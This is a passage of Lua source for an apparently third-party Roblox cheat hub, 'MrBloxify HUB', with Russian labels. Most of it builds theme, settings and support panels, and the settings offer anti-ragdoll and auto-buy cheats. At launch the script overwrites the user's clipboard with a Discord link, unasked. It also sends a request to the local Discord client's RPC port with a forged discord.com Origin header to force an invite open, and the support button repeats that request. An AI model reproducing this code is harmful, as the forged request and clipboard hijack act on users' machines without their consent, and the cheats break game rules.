            special.MouseButton1Click:Connect(function()
                settings.bloxTheme = key

                applyBloxTheme(false)
                hub.refreshBloxXmas()
                refreshSwatches()
                saveSettings()
            end)
        end

        local colorsLabel = make("TextLabel", {
            Size = UDim2.new(1, -24, 0, 14),
            Position = UDim2.fromOffset(12, 118),
            BackgroundTransparency = 1,
            Font = Enum.Font.GothamBold,
            Text = "Цвета",
            TextSize = 10,
            TextXAlignment = Enum.TextXAlignment.Left,
        }, panel)
        bReg(colorsLabel, "TextColor3", "textSub")

        for i, preset in ipairs(presets) do
            local column = (i - 1) % 8
            local row = math.floor((i - 1) / 8)

            local swatch = make("TextButton", {
                Size = UDim2.fromOffset(28, 22),
                Position = UDim2.fromOffset(17 + column * 34, 134 + row * 28),
                BackgroundColor3 = Color3.fromHSV(preset[1], preset[2] * 0.6, 0.85),
                BorderSizePixel = 0,
                Text = "",
                AutoButtonColor = false,
            }, panel)
            make("UICorner", {CornerRadius = UDim.new(0, 8)}, swatch)

            local swatchStroke = make("UIStroke", {
                Thickness = 2,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
                Enabled = false,
            }, swatch)
            bReg(swatchStroke, "Color", "text")

            swatches[#swatches + 1] = {hue = preset[1], sat = preset[2], stroke = swatchStroke}
            attachClick(swatch)

            swatch.MouseButton1Click:Connect(function()
                settings.bloxTheme = "custom"
                settings.bloxHue = preset[1]
                settings.bloxSat = preset[2]
                knob.Position = UDim2.new(settings.bloxHue, 0, 0.5, 0)

                applyBloxTheme(false)
                hub.refreshBloxXmas()
                refreshSwatches()
                saveSettings()
            end)
        end

        refreshSwatches()

        local hueLabel = make("TextLabel", {
            Size = UDim2.new(1, -24, 0, 14),
            Position = UDim2.fromOffset(12, 192),
            BackgroundTransparency = 1,
            Font = Enum.Font.GothamBold,
            Text = "Свой оттенок",
            TextSize = 10,
            TextXAlignment = Enum.TextXAlignment.Left,
        }, panel)
        bReg(hueLabel, "TextColor3", "textSub")

        make("UICorner", {CornerRadius = UDim.new(1, 0)}, hueBar)

        local keypoints = {}
        for i = 0, 6 do
            keypoints[#keypoints + 1] = ColorSequenceKeypoint.new(i / 6, Color3.fromHSV(i / 6, 0.6, 0.95))
        end

        make("UIGradient", {Color = ColorSequence.new(keypoints)}, hueBar)
        make("UICorner", {CornerRadius = UDim.new(0, 4)}, knob)

        local knobStroke = make("UIStroke", {Thickness = 1.5}, knob)
        bReg(knobStroke, "Color", "text")

        local hueDragging = false

        local function setHueFromX(x)
            local width = hueBar.AbsoluteSize.X

            if width <= 0 then
                return
            end

            local value = math.clamp((x - hueBar.AbsolutePosition.X) / width, 0, 1)

            settings.bloxTheme = "custom"
            settings.bloxHue = value
            settings.bloxSat = 1
            knob.Position = UDim2.new(value, 0, 0.5, 0)

            applyBloxTheme(true)
            hub.refreshBloxXmas()
            refreshSwatches()
        end

        hueBar.InputBegan:Connect(function(input)
            local inputType = input.UserInputType

            if inputType == Enum.UserInputType.MouseButton1
                or inputType == Enum.UserInputType.Touch then

                hueDragging = true
                setHueFromX(input.Position.X)
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            if not hueDragging then
                return
            end

            local inputType = input.UserInputType

            if inputType == Enum.UserInputType.MouseMovement
                or inputType == Enum.UserInputType.Touch then

                setHueFromX(input.Position.X)
            end
        end)

        UserInputService.InputEnded:Connect(function(input)
            if not hueDragging then
                return
            end

            local inputType = input.UserInputType

            if inputType == Enum.UserInputType.MouseButton1
                or inputType == Enum.UserInputType.Touch then

                hueDragging = false
                saveSettings()
            end
        end)

        return panel
    end

    local bloxThemePanel = buildBloxThemePanel()
    local bloxThemeOpen = false

    local function showBloxPanel(open, instant)
        bloxThemeOpen = open

        local target = open and UDim2.new(0, 0, 0, 48) or UDim2.new(0, 0, 1, 0)

        if instant then
            bloxThemePanel.Position = target
        else
            TweenService:Create(bloxThemePanel, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Position = target
            }, "animPanels"):Play()
        end
    end

    bloxThemeButton.MouseButton1Click:Connect(function()
        if not bloxThemeOpen then
            hub.showBloxSettings(false)
        end

        showBloxPanel(not bloxThemeOpen)
    end)

    -- ===== Кнопка ⚙️ и панель настроек MrBloxify (как в MRBLOXIFY HUB) =====
    -- Обёрнуто в функцию, чтобы не упереться в лимит локальных переменных (200).
    ;(function()
        -- Кнопка сворачивания окна (как в MRBLOXIFY HUB)
        local collapseButton = make("TextButton", {
            Size = UDim2.fromOffset(18, 18),
            Position = UDim2.new(1, -70, 0, 13),
            BorderSizePixel = 0,
            Text = "–",
            Font = Enum.Font.GothamBold,
            TextSize = 14,
            AutoButtonColor = false,
        }, bloxTop)
        bReg(collapseButton, "BackgroundColor3", "hover")
        bReg(collapseButton, "TextColor3", "textInput")
        make("UICorner", {CornerRadius = UDim.new(1, 0)}, collapseButton)
        attachClick(collapseButton)

        local collapsed = false
        local expandedSize = UDim2.fromOffset(300, 205)
        local collapsedSize = UDim2.fromOffset(300, 44)

        collapseButton.MouseButton1Click:Connect(function()
            collapsed = not collapsed

            TweenService:Create(bloxFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = collapsed and collapsedSize or expandedSize
            }, "animPanels"):Play()

            collapseButton.Text = collapsed and "+" or "–"
        end)

        local gearButton = make("TextButton", {
            Size = UDim2.fromOffset(18, 18),
            Position = UDim2.new(1, -92, 0, 13),
            BorderSizePixel = 0,
            Text = "⚙️",
            Font = Enum.Font.GothamBold,
            TextSize = 12,
            AutoButtonColor = false,
        }, bloxTop)
        bReg(gearButton, "BackgroundColor3", "hover")
        bReg(gearButton, "TextColor3", "textInput")
        make("UICorner", {CornerRadius = UDim.new(1, 0)}, gearButton)
        attachClick(gearButton)

        local panel = make("ScrollingFrame", {
            Name = "BloxSettingsPanel",
            Size = UDim2.new(1, 0, 0, 157),
            Position = UDim2.new(0, 0, 1, 0),
            CanvasSize = UDim2.new(0, 0, 0, 394),
            ScrollBarThickness = 3,
            BorderSizePixel = 0,
            Active = true,
            ZIndex = 10,
        }, bloxFrame)
        bReg(panel, "BackgroundColor3", "bg")

        local function makeRow(index, labelText, getText, onClick)
            local y = 2 + (index - 1) * 30

            local label = make("TextLabel", {
                Size = UDim2.fromOffset(130, 26),
                Position = UDim2.fromOffset(12, y),
                BackgroundTransparency = 1,
                Font = Enum.Font.GothamBold,
                Text = labelText,
                TextSize = 11,
                TextXAlignment = Enum.TextXAlignment.Left,
            }, panel)
            bReg(label, "TextColor3", "text")

            local button = make("TextButton", {
                Size = UDim2.fromOffset(110, 26),
                Position = UDim2.new(1, -122, 0, y),
                BackgroundTransparency = 0.35,
                BorderSizePixel = 0,
                Font = Enum.Font.GothamBold,
                Text = getText(),
                TextSize = 10,
                AutoButtonColor = false,
            }, panel)
            bReg(button, "BackgroundColor3", "button")
            bReg(button, "TextColor3", "textMain")
            make("UICorner", {CornerRadius = UDim.new(0, 10)}, button)
            addBloxHover(button)

            hub.rows[#hub.rows + 1] = function()
                button.Text = getText()
            end

            button.MouseButton1Click:Connect(function()
                onClick()
                button.Text = getText()
                saveSettings()
            end)
        end

        local function onOff(value)
            return value and "ВКЛ" or "ВЫКЛ"
        end

        makeRow(1, "Анимации", function()
            return onOff(settings.animations)
        end, function()
            settings.animations = not settings.animations

            if not settings.animations then
                stopPulse()
                stopBloxPulse()
            elseif scanning then
                startPulse()
                startBloxPulse()
            end
        end)

        makeRow(2, "Скорость", function()
            return "x" .. tostring(settings.speed)
        end, function()
            settings.speed = nextIn(speeds, settings.speed)
        end)

        makeRow(3, "Пульсация", function()
            return onOff(settings.pulse)
        end, function()
            settings.pulse = not settings.pulse

            if settings.pulse and scanning then
                startPulse()
                startBloxPulse()
            else
                stopPulse()
                stopBloxPulse()
            end

            hub.sync()
        end)

        makeRow(4, "Размер окна", function()
            return tostring(settings.scale)
        end, function()
            settings.scale = nextIn(sizes, settings.scale)
            TweenService:Create(bloxScale, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Scale = settings.scale
            }):Play()
        end)

        makeRow(5, "Прозрачность", function()
            return tostring(settings.transparency)
        end, function()
            settings.transparency = nextIn(opacities, settings.transparency)

            local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            TweenService:Create(bloxFrame, info, {BackgroundTransparency = settings.transparency}):Play()
            TweenService:Create(mainFrame, info, {BackgroundTransparency = settings.transparency}):Play()
        end)

        makeRow(6, "Анимация окна", function()
            return onOff(settings.animWindow)
        end, function()
            settings.animWindow = not settings.animWindow
        end)

        makeRow(7, "Анимация кнопок", function()
            return onOff(settings.animButtons)
        end, function()
            settings.animButtons = not settings.animButtons
        end)

        makeRow(8, "Анимация панелей", function()
            return onOff(settings.animPanels)
        end, function()
            settings.animPanels = not settings.animPanels
        end)

        makeRow(9, "Звук", function()
            return onOff(settings.sound)
        end, function()
            settings.sound = not settings.sound
        end)

        makeRow(10, "Громкость", function()
            return tostring(settings.volume)
        end, function()
            settings.volume = nextIn(volumes, settings.volume)
        end)

        makeRow(11, "Авто-запуск", function()
            return onOff(settings.autoUseCode)
        end, function()
            settings.autoUseCode = not settings.autoUseCode
        end)

        makeRow(12, "Anti Ragdoll", function()
            return onOff(hub.antiRagdoll)
        end, function()
            hub.setAntiRagdoll(not hub.antiRagdoll)
            hub.refreshRows()
        end)

        makeRow(13, "Авто-покупка", function()
            return onOff(hub.autoBuy)
        end, function()
            hub.setAutoBuy(not hub.autoBuy)
            hub.refreshRows()
        end)

        -- Открытие/закрытие панели (вместе с панелью тем они взаимно исключаются)
        local open = false

        function hub.showBloxSettings(state, instant)
            open = state

            local target = state and UDim2.new(0, 0, 0, 48) or UDim2.new(0, 0, 1, 0)

            if instant then
                panel.Position = target
            else
                TweenService:Create(panel, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                    Position = target
                }, "animPanels"):Play()
            end
        end

        gearButton.MouseButton1Click:Connect(function()
            if not open and bloxThemeOpen then
                showBloxPanel(false)
            end

            hub.showBloxSettings(not open)
        end)
    end)()

    -- ===== Кнопка 💬 и окно поддержки MrBloxify (как в MRBLOXIFY HUB) =====
    ;(function()
        -- Ссылка поддержки: по умолчанию та же, что в MRBLOXIFY HUB. Замени на свою при необходимости.
        local link = SUPPORT_LINK
        local code = SUPPORT_CODE

        local supportFrame = make("Frame", {
            Name = "BloxSupportFrame",
            Size = UDim2.fromOffset(280, 160),
            AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.fromScale(0.5, 0.55),
            BackgroundTransparency = 0.1,
            BorderSizePixel = 0,
            Visible = false,
            ZIndex = 5,
        }, screenGui)
        bReg(supportFrame, "BackgroundColor3", "bg")
        make("UIScale", {Scale = 1.2}, supportFrame)
        make("UICorner", {CornerRadius = UDim.new(0, 14)}, supportFrame)
        local supportStroke = make("UIStroke", {Thickness = 1.5}, supportFrame)
        bReg(supportStroke, "Color", "stroke")

        local header = make("Frame", {
            Size = UDim2.new(1, 0, 0, 30),
            BackgroundTransparency = 0.2,
            BorderSizePixel = 0,
        }, supportFrame)
        bReg(header, "BackgroundColor3", "bar")
        make("UICorner", {CornerRadius = UDim.new(0, 14)}, header)

        local title = make("TextLabel", {
            Size = UDim2.new(1, -50, 1, 0),
            Position = UDim2.fromOffset(12, 0),
            BackgroundTransparency = 1,
            Font = Enum.Font.GothamBold,
            Text = "💬 ПОДДЕРЖКА",
            TextSize = 14,
            TextXAlignment = Enum.TextXAlignment.Left,
        }, header)
        bReg(title, "TextColor3", "text")

        local closeButton = make("TextButton", {
            Size = UDim2.fromOffset(18, 18),
            Position = UDim2.new(1, -26, 0, 6),
            BorderSizePixel = 0,
            Font = Enum.Font.GothamBold,
            Text = "X",
            TextSize = 12,
            AutoButtonColor = false,
        }, header)
        bReg(closeButton, "BackgroundColor3", "hover")
        bReg(closeButton, "TextColor3", "textMain")
        make("UICorner", {CornerRadius = UDim.new(1, 0)}, closeButton)
        attachClick(closeButton)

        local info = make("TextLabel", {
            Size = UDim2.new(1, -24, 0, 66),
            Position = UDim2.fromOffset(12, 36),
            BackgroundTransparency = 1,
            Font = Enum.Font.Gotham,
            Text = "Вопросы, баги и идеи — заходи в наш Discord:\n" .. link,
            TextSize = 13,
            TextWrapped = true,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextYAlignment = Enum.TextYAlignment.Top,
        }, supportFrame)
        bReg(info, "TextColor3", "textSub")

        local copyButton = make("TextButton", {
            Size = UDim2.new(1, -24, 0, 34),
            Position = UDim2.fromOffset(12, 112),
            BackgroundTransparency = 0.35,
            BorderSizePixel = 0,
            Font = Enum.Font.GothamBold,
            Text = "📋 Скопировать ссылку",
            TextSize = 14,
            AutoButtonColor = false,
        }, supportFrame)
        bReg(copyButton, "BackgroundColor3", "button")
        bReg(copyButton, "TextColor3", "textMain")
        make("UICorner", {CornerRadius = UDim.new(0, 10)}, copyButton)
        addBloxHover(copyButton)

        local token = 0

        copyButton.MouseButton1Click:Connect(function()
            local copied = false

            -- Roblox не даёт открыть браузер из скрипта, поэтому копируем ссылку
            pcall(function()
                local copy = setclipboard or toclipboard

                if copy then
                    copy(link)
                    copied = true
                end
            end)

            -- Пытаемся открыть приглашение в клиенте Discord (если он запущен)
            task.spawn(function()
                pcall(function()
                    local httpRequest = (syn and syn.request)
                        or (http and http.request)
                        or http_request
                        or request

                    if httpRequest then
                        httpRequest({
                            Url = "http://127.0.0.1:6463/rpc?v=1",
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json",
                                ["Origin"] = "https://discord.com",
                            },
                            Body = HttpService:JSONEncode({
                                cmd = "INVITE_BROWSER",
                                args = {code = code},
                                nonce = HttpService:GenerateGUID(false),
                            }),
                        })
                    end
                end)
            end)

            token += 1
            local current = token

            copyButton.Text = copied and "✅ Ссылка скопирована!" or "Ссылка выше ☝️"

            task.delay(2.5, function()
                if token == current then
                    copyButton.Text = "📋 Скопировать ссылку"
                end
            end)
        end)

        closeButton.MouseButton1Click:Connect(function()
            supportFrame.Visible = false
        end)

        -- Перетаскивание за заголовок
        local dragging = false
        local dragStart
        local startPos

        header.InputBegan:Connect(function(input)
            local t = input.UserInputType

            if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = supportFrame.Position
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            if not dragging then
                return
            end

            local t = input.UserInputType

            if t == Enum.UserInputType.MouseMovement or t == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart

                supportFrame.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + delta.X,
                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
                )
            end
        end)

        UserInputService.InputEnded:Connect(function(input)
            local t = input.UserInputType

            if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
                dragging = false
            end
        end)

        -- Кнопка 💬 в шапке MrBloxify
        local supportButton = make("TextButton", {
            Size = UDim2.fromOffset(18, 18),
            Position = UDim2.new(1, -158, 0, 13),
            BorderSizePixel = 0,
            Text = "💬",
            Font = Enum.Font.GothamBold,
            TextSize = 12,
            AutoButtonColor = false,
        }, bloxTop)
        bReg(supportButton, "BackgroundColor3", "hover")
        bReg(supportButton, "TextColor3", "textInput")
        make("UICorner", {CornerRadius = UDim.new(1, 0)}, supportButton)
        attachClick(supportButton)

        supportButton.MouseButton1Click:Connect(function()
            supportFrame.Visible = not supportFrame.Visible
        end)

        -- При возврате в MRBLOXIFY HUB прячем окно поддержки MrBloxify
        backButton.MouseButton1Click:Connect(function()
            supportFrame.Visible = false
        end)
    end)()

    -- Переключение окон
    local function openBlox()
        hub.refreshRows()
        bloxFrame.Position = mainFrame.Position
        showBloxPanel(false, true)
        hub.showBloxSettings(false, true)
        bloxFrame.BackgroundTransparency = settings.transparency
        bloxScale.Scale = 0
        hub.sync()
        mainFrame.Visible = false
        bloxFrame.Visible = true

        TweenService:Create(bloxScale, backInfo, {Scale = settings.scale}, "animWindow"):Play()
    end

    local function openMrBloxifyHub()
        hub.refreshRows()
        mainFrame.Position = bloxFrame.Position
        delayBox.Text = tostring(delay)
        mainFrame.BackgroundTransparency = settings.transparency
        bloxFrame.Visible = false
        mainFrame.Visible = true
        scale.Scale = 0

        TweenService:Create(scale, backInfo, {Scale = settings.scale}, "animWindow"):Play()
    end

    backButton.MouseButton1Click:Connect(openMrBloxifyHub)

    -- Кнопка 🔄 в шапке MRBLOXIFY HUB, открывает MrBloxify
    local switchButton = make("TextButton", {
        Size = UDim2.fromOffset(18, 18),
        Position = UDim2.new(1, -180, 0, 13),
        BorderSizePixel = 0,
        Text = "🔄",
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = false,
    }, topBar)
    themeReg(switchButton, "BackgroundColor3", "hover")
    themeReg(switchButton, "TextColor3", "textMain")
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, switchButton)
    attachClick(switchButton)
    switchButton.MouseButton1Click:Connect(openBlox)
end

-- ========================= Запуск =========================

local notifyRemote = findNotifyRemote()

if notifyRemote then
    notifyRemote.OnClientEvent:Connect(receiveMessage)
end

-- Следим за текстом на экране и за чатом: при "use code" запуск включается сам
local function watchLabel(object, check)
    if not (object:IsA("TextLabel") or object:IsA("TextButton")) or isOwnGui(object) then
        return
    end

    if check then
        hub.noteResult(object.Text)
        hub.tryAutoCode(object.Text)
    end

    object:GetPropertyChangedSignal("Text"):Connect(function()
        hub.noteResult(object.Text)
        hub.tryAutoCode(object.Text)
    end)
end

PlayerGui.DescendantAdded:Connect(function(object)
    watchLabel(object, true)
end)

task.spawn(function()
    local descendants = PlayerGui:GetDescendants()

    for i = 1, #descendants do
        pcall(watchLabel, descendants[i], true)

        if i % 200 == 0 then
            task.wait()
        end
    end
end)

pcall(function()
    game:GetService("TextChatService").MessageReceived:Connect(function(message)
        hub.noteResult(message.Text)
        hub.tryAutoCode(message.Text)
    end)
end)

task.defer(findControls)

-- ========================= Автооткрытие Discord при запуске =========================
-- При каждом запуске скрипта копируем ссылку и пробуем открыть приглашение
task.spawn(function()
    pcall(function()
        local copy = setclipboard or toclipboard

        if copy then
            copy(SUPPORT_LINK)
        end
    end)

    local opened = false

    -- Через клиент Discord (если он запущен на компьютере)
    pcall(function()
        local httpRequest = (syn and syn.request)
            or (http and http.request)
            or http_request
            or request

        if httpRequest then
            local response = httpRequest({
                Url = "http://127.0.0.1:6463/rpc?v=1",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["Origin"] = "https://discord.com",
                },
                Body = HttpService:JSONEncode({
                    cmd = "INVITE_BROWSER",
                    args = {code = SUPPORT_CODE},
                    nonce = HttpService:GenerateGUID(false),
                }),
            })

            opened = response ~= nil and (response.StatusCode == nil or response.StatusCode < 400)
        end
    end)

    -- Запасной вариант: открыть в браузере
    if not opened then
        pcall(function()
            game:GetService("GuiService"):OpenBrowserWindow(SUPPORT_LINK)
        end)
    end
end)
